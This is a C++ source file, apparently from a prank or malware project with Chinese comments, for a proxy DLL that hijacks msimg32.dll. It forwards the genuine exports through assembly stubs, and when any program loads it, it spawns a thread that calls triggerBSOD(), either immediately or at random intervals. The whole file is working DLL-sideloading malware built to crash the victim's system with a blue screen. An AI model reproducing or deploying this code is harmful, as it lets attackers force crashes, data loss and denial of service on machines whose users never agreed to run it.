// Hijack 目標 : msimg32.dll
#include "pch.h"
#include "BSOD.h"

#include <iostream>
#include <Windows.h>
#include <ctime>

#pragma comment(linker, "/EXPORT:AlphaBlend=_HijackFunc_AlphaBlend,@2")
#pragma comment(linker, "/EXPORT:DllInitialize=_HijackFunc_DllInitialize,@3")
#pragma comment(linker, "/EXPORT:GradientFill=_HijackFunc_GradientFill,@4")
#pragma comment(linker, "/EXPORT:TransparentBlt=_HijackFunc_TransparentBlt,@5")
#pragma comment(linker, "/EXPORT:vSetDdrawflag=_HijackFunc_vSetDdrawflag,@1")

#define EXTERNC extern "C"
#define NAKED __declspec(naked)
#define EXPORT __declspec(dllexport)
#define ALCPP EXPORT NAKED
#define ALSTD EXTERNC EXPORT NAKED void __stdcall
#define ALCFAST EXTERNC EXPORT NAKED void __fastcall
#define ALCDECL EXTERNC NAKED void __cdecl

// 如果想要不定時觸發可取消已下註解
// #define _USE_CHANCE

const int CHANCE = 1;
const int CHANCE_RATE = 1000;
const int SLEEP_TIME = 5000;

HMODULE hModule = NULL;
HMODULE current = NULL;
DWORD dwReturn[17] = { 0 };

inline BOOL WINAPI Load() {
	TCHAR tzPath[MAX_PATH];
	lstrcpy(tzPath, TEXT("msimg32.dll"));
	hModule = LoadLibrary(tzPath);
	if (hModule == NULL) {
		return FALSE;
	}
	return hModule != NULL;
}

inline VOID WINAPI Free() {
	if (hModule) {
		FreeLibrary(hModule);
	}
}

FARPROC WINAPI GetAddress(PCSTR pszProcName) {
	FARPROC fpAddress;
	fpAddress = GetProcAddress(hModule, pszProcName);
	if (fpAddress == NULL) {
		ExitProcess(-2);
	}
	return fpAddress;
}

DWORD WINAPI HijackMain(LPVOID lpParam) {
	while (TRUE) {
#ifdef _USE_CHANCE
		Sleep(SLEEP_TIME);
		if (rand() % CHANCE_RATE < CHANCE) {
			triggerBSOD();
			break;
		}
#else
		triggerBSOD();
		break;
#endif
	}
	return EXIT_SUCCESS;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH: {
		DisableThreadLibraryCalls(hModule);
		current = hModule;
		if (Load()) {
			srand(time(NULL));
			CreateThread(NULL, 0, HijackMain, NULL, 0, NULL);
		}
		break;
	}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH: {
		break;
	}
	case DLL_PROCESS_DETACH: {
		Free();
		break;
	}
	}
	return TRUE;
}

// Hijack 函式堆
ALCDECL HijackFunc_AlphaBlend() {
	__asm POP dwReturn[0 * TYPE LONG];
	GetAddress("AlphaBlend")();
	__asm JMP dwReturn[0 * TYPE LONG];
}

ALCDECL HijackFunc_DllInitialize() {
	__asm POP dwReturn[0 * TYPE LONG];
	GetAddress("DllInitialize")();
	__asm JMP dwReturn[0 * TYPE LONG];
}

ALCDECL HijackFunc_GradientFill() {
	__asm POP dwReturn[0 * TYPE LONG];
	GetAddress("GradientFill")();
	__asm JMP dwReturn[0 * TYPE LONG];
}

ALCDECL HijackFunc_TransparentBlt() {
	__asm POP dwReturn[0 * TYPE LONG];
	GetAddress("TransparentBlt")();
	__asm JMP dwReturn[0 * TYPE LONG];
}

ALCDECL HijackFunc_vSetDdrawflag() {
	__asm POP dwReturn[0 * TYPE LONG];
	GetAddress("vSetDdrawflag")();
	__asm JMP dwReturn[0 * TYPE LONG];
}